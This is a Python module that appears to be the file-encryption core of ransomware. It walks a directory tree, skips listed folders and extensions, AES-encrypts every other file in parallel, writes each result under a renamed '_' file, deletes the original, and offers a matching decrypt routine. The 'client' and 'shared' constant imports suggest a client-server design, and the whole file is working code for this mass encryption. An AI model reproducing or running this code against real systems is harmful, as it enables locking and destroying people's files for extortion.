import multiprocessing
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from consts.client_consts import NONCE_SIZE
from consts.shared_consts import DECRYPT, ENCRYPT


def aes_encryption_function(data: bytes, aes_key: bytes, mode: int) -> bytes:
    nonce = get_random_bytes(NONCE_SIZE)
    cipher = AES.new(aes_key, mode, nonce=nonce)
    encrypted_data = cipher.encrypt(data)
    return nonce + encrypted_data

def aes_decryption_function(file_data: bytes, aes_key: bytes, mode: int) -> bytes:

    nonce = file_data[:NONCE_SIZE]
    ciphertext = file_data[NONCE_SIZE:]
    cipher = AES.new(aes_key, mode, nonce=nonce)
    
    return cipher.decrypt(ciphertext)

def encrypt_single_file(full_path: str, aes_key: bytes, mode: int):
    try:
        with open(full_path, "rb") as f:
            file_data = f.read()
            
        
        encrypted_data = aes_encryption_function(file_data, aes_key, mode)
        encrypted_path = full_path + "_"
        
        
        with open(encrypted_path, "wb") as f:
            f.write(encrypted_data)
        os.remove(full_path)
        
        return f"V {full_path}"
    except Exception as e:
        return f"X Error encrypting {full_path}: {e}"

def decrypt_single_file(full_path: str, aes_key: bytes, mode: int):
    try:
        with open(full_path, "rb") as f:
            file_data = f.read()
            
        decrypted_data = aes_decryption_function(file_data, aes_key, mode)
        
        original_path = full_path[:-1] 
        
        with open(original_path, "wb") as f:
            f.write(decrypted_data)
            
        os.remove(full_path) 
        return f"V Decryption succeeded {full_path}"
    except Exception as e:
        return f"X Decryption failed {full_path}: {e}"

def prepare_tasks(folder_path: str, task_arguments: list, action: bytes, ignored_folders: list, ignored_extensions: tuple) -> list[tuple]:
    tasks = []
    if ignored_folders is None:
        ignored_folders = []
    
    for root, dirs, files in os.walk(folder_path):
        dirs[:] = [d for d in dirs if d not in ignored_folders]
        
        for file_name in files:
            full_path = os.path.join(root, file_name)
            
            if action == ENCRYPT:        
                if not full_path.endswith(ignored_extensions):
                    tasks.append((full_path, *task_arguments))
            elif action == DECRYPT:
                if full_path.endswith("_"):
                    tasks.append((full_path, *task_arguments))
    return tasks

def process_files(folder_path: str, process_function, process_arguments, action: str, ignored_folders: list = None, ignored_extensions: tuple = ()):
    tasks = prepare_tasks(folder_path, process_arguments, action, ignored_folders, ignored_extensions)
    with multiprocessing.Pool() as pool:
        results = pool.starmap(process_function, tasks)
        